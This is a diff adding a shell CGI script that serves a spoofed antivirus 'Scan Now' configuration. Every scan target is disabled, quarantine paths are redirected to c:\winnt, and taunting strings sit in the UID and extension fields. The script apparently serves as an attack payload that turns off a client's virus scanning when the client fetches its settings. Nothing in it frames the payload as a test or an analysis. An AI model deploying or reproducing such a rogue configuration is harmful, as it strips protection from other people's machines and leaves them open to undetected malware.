@@ -1,0 +1,19 @@
+#!/bin/sh
+
+echo "Content-type: text/plain"
+echo
+echo "[Scan Now Configuration]"
+echo "UID=N0thing th4nk you"
+echo "Scan Memory=0"
+echo "CompressedLayer=2"
+echo "ScanALLFiles=0"
+echo "ExtList= YES IT's POSS1bl3 !"
+echo "ScanRemoveable=0"
+echo "ScanFixedDisk=0"
+echo "ScanCDRom=0"
+echo "VirusFoundAction=5"
+echo "BkUpIfClean=0"
+echo "MoveDir=c:\winnt"
+echo "CleanFailedAction=3"
+echo "CleanFailedMoveDir=c:\winnt"
+echo "Reserved="
